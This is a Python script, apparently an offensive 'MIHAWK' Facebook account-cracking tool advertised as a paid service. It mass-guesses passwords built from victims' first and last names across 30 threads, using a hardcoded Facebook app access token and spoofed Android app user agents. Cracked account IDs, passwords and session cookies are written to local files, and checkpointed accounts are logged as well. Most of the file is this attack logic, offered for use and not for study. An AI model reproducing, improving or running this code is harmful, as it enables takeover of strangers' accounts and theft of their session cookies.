"""
----------------------------------------------------------------------------
#IF THERE IS NS FOOD FOR THE POOR, #THERE WILL BE NO SECURITY FOR THE R
#MIHAWK_☑️
----------------------------------------------------------------------------
"""
...
xr = f"\x1b[38;5;46m\x1b[1;97m=\x1b[38;5;46m"
xrxx = f"\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m]"
xrx = f"\x1b[38;5;46m[\x1b[1;97m?\x1b[38;5;46m]"
xr1 = f"\x1b[38;5;46m[\x1b[1;97m1\x1b[38;5;46m]"
xr2 = f"\x1b[38;5;46m[\x1b[1;97m2\x1b[38;5;46m]"
xr0 = f"\x1b[38;5;46m[\x1b[1;97m0\x1b[38;5;46m]"
#__________/-SYS-\__________#
sys.stdout.write('\x1b[1;37m\x1b]2; EID~MIHAWK\x07')
...
logo = (f"""{G}
M   M III H  H  AA  W     W K  K 
MM MM  I  H  H A  A W     W K K  
M M M  I  HHHH AAAA W  W  W KK   
M   M  I  H  H A  A  W W W  K K  
M   M III H  H A  A   W W   K  K
{G}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{xrxx} FACEBOK  {xr}{G} PROFESOR
{xrxx} GITHUB   {xr}{G} MIHAWK
{xrxx} SERVICE  {xr}{G} PAID
{xrxx} VERSION  {xr}{G} 0.4
{G}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
...
#__________/-MAIN-MENU-\__________#
    def __meNu__(self):
    	self.__clearX__()
    	print(f"{xr1} FILE CRACK ")
    	#print(f"{xr2} FILE CREAT FB ")
    #	print(f"{xr3} WHATSAPP GROUP ")
    	#print(f"{xr4} TELEGRAM ")
    #	print(f"{xr5} FOLLOW FB ")
    	print(f"{xr0} EXIT ")
    	self.__lineX__()
...
#__________/-FILE-MENU-\__________#
    def __fileX__(self):
    	self.__clearX__()
    	print(f"{xrxx} EXAMPLE   {xr}{R} /{G}sdcard{R}/{G}MIHAWK.txt")
    	self.__lineX__()
    	...
    	if __pasX__ == ("1"):
    	    self.plist.append("lastfirst")
    	    self.plist.append("firstfirst")
    	    self.plist.append("firstlast")
    	    self.plist.append("last last")
    	    self.plist.append("first first")
    	    self.plist.append("last first")
    	    self.plist.append("first last")
    	    self.plist.append("first123")
    	    self.plist.append("first12345")
    	    self.plist.append("first1234")
    	    self.plist.append("first123456")
    	    self.plist.append("first123456789")
    	    self.plist.append("firstlast123456")
    	    self.plist.append("first@123")
    	    self.plist.append("first2002")
    	    self.plist.append("first2003")
    	    self.plist.append("first2001")
    	    self.plist.append("first2000")
    	    self.plist.append("first2020")
    	    self.plist.append("first1999")
    	else:
    	    try:
    	        self.__clearX__()
    	...
    	with ThreadPool(max_workers=30) as __giftXX__:
    	    ...
    	    print(f"{xrxx} IF NO RESULT ON{G}/{G}OFF AIRPLANE MODE...! 3 ")
    	    self.__lineX__()
    	...
    	print(f"{xrxx} TOTAL {G}OK{W}/{R}CP {xr}{B} "+str(len(self.oks))+f"{W}/{R}"+str(len(self.cps)))
    	print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    	print(f"{xrxx} THANKS FOR USING.....! ")
#__________/-FILE-M1-\__________#
    def ___M1XX___(self,ids,names,passlist):
        try:
            ...
            sys.stdout.write(f"\r\r{xrxx}{R}-{G}/{ne}MIHAWK-M1{G}/{R}-{G}/{W}{self.loop}{G}/{R}-{G}/{G}{len(self.oks)}{G}/{R}-{G}{G}/{R}{len(self.cps)}{G}/")
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            ...
            for pw in passlist:
                ...
                if "session_key" in giftt:
                    ...
                    print(f"\r\r{xrxx}{G}-{G}/{G}MIHAWK-OK{G}/ {xr}{G} "+ids+f"{G} / {G}"+pas+"\033[1;32m")
                    print(f"{xrxx}{G}-{G}/{G}COOKIE{G}/  {xr}{G} "+cookies)
                    self.__lineX__()
                    open('/sdcard/MIHAWK-FILE-M1-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in giftt['error']['message']:
                    print(f"\r\r{xrxx}{W}-{G}/{W}MIHAWK-CP{G}/ {xr}{R} "+ids+f"{G} / {R}"+pas+"\033[1;97m")
                    self.__lineX__()
                    open('/sdcard/MIHAWK-FILE-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
...
#__________/-FILE-M2-\__________#
    def ___M2XX___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            ne = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
            sys.stdout.write(f"\r\r{xrxx}{R}-{G}/{ne}MIHAWK-M2{G}/{R}-{G}/{W}{self.loop}{G}/{R}-{G}/{G}{len(self.oks)}{G}/{R}-{G}{G}/{R}{len(self.cps)}{G}/")
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            ...
            for pw in passlist:
                ...
                if "session_key" in giftt:
                    ...
                    print(f"{xrxx}{G}-{G}/{G}COOKIE{G}/  {xr}{G} "+cookies)
                    self.__lineX__()
                    open('/sdcard/MIHAWK-FILE-M2-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in giftt['error']['message']:
                    print(f"\r\r{xrxx}{W}-{G}/{W}MIHAWK-CP{G}/ {xr}{G} "+ids+f"{G} / {G}"+pas+"\033[1;97m")
                    self.__lineX__()
                    open('/sdcard/MIHAWK-FILE-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
...
#__________/-RANDOM-M1-\__________#
    def __M1X__(self,ids,passlist):
    	global loop,oks,cps
    	ne = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	sys.stdout.write(f"\r\r{xrxx}{R}-{G}/{ne}MIHAWK-M1{G}/{R}-{G}/{W}{self.loop}{G}/{R}-{G}/{B}{len(self.oks)}{G}/{R}-{G}{G}/{R}{len(self.cps)}{G}/")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                ...
                if "session_key" in giftt:
                    uid = giftt['uid']
                    cookies = ";".join(i["name"]+"="+i["value"] for i in giftt["session_cookies"])
                    print(f"\r\r{xrxx}{R}-{G}/{B}MIHAWK-OK{G}/ {xr}{B} {str(uid)} {G}/{B} {pas}")
                    print(f"{xrxx}{R}-{G}/{B}COOKIE{G}/  {xr}{P} "+cookies)
                    self.__lineX__()
                    open('/sdcard/MIHAWK-RANDOM-M1-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(str(uid))
                    break
                elif 'www.facebook.com' in giftt['error']['message']:
                    uid = giftt['error']['error_data']['uid']
                    print(f"\r\r{xrxx}{R}-{G}/{R}MIHAWK-CP{G}/ {xr}{R} {str(uid)} {G}/{R} {pas}")
                    self.__lineX__()
                    open('/sdcard/MIHAWK-RANDOM-M1-CP.txt','a').write(str(uid)+'/'+pas+'\n')
...
#__________/-RANDOM-M2-\__________#
    def __M2X__(self,ids,passlist):
    	global loop,oks,cps
    	ne = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	sys.stdout.write(f"\r\r{xrxx}{R}-{G}/{ne}MIHAWK-M2{G}/{R}-{G}/{W}{self.loop}{G}/{R}-{G}/{B}{len(self.oks)}{G}/{R}-{G}{G}/{R}{len(self.cps)}{G}/")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                ...
                if "session_key" in giftt:
                    ...
                    print(f"{xrxx}{R}-{G}/{B}COOKIE{G}/  {xr}{P} "+cookies)
                    self.__lineX__()
                    open('/sdcard/MIHAWK-RANDOM-M2-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(str(uid))
                    break
                elif 'www.facebook.com' in giftt['error']['message']:
                    uid = giftt['error']['error_data']['uid']
                    print(f"\r\r{xrxx}{R}-{G}/{R}MIHAWK-CP{G}/ {xr}{R} {str(uid)} {G}/{R} {pas}")
                    self.__lineX__()
                    open('/sdcard/MIHAWK-RANDOM-M2-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
...
#__________/-UA-\__________#
    def __UPD__(self):
    	ua1 = "[FBAN/FB4A;FBAV/360.0.0.77.77;FBBV/748582260;FBDM/{density=4.0,width=1440,height=1600};FBLC/tr_TR;FBRV/449347538;FBCR/Zain;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1909;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
    	ua2 = "[FBAN/FB4A;FBAV/439.0.0.58.28;FBBV/486686569;FBDM/{density=4.0,width=1440,height=1280};FBLC/fr_FR;FBRV/169090740;FBCR/MTN;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1909;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    	ua3 = "[FBAN/FB4A;FBAV/547.0.0.39.13;FBBV/230116790;FBDM/{density=4.0,width=1080,height=1600};FBLC/ar_DZ;FBRV/129438574;FBCR/Djezzy;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2239;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
    	ua4 = "[FBAN/FB4A;FBAV/538.0.0.53.70;FBBV/819570880;FBDM/{density=1.4375,width=720,height=1473};FBLC/fr_FR;FBRV/0;FBCR/Ooredoo;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3611;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
    	ua5 = "[FBAN/FB4A;FBAV/558.0.0.44.25;FBBV/490220987;FBDM/{density=4.0,width=720,height=1280};FBLC/fr_FR;FBRV/710131711;FBCR/Orange;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/X681B;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]"
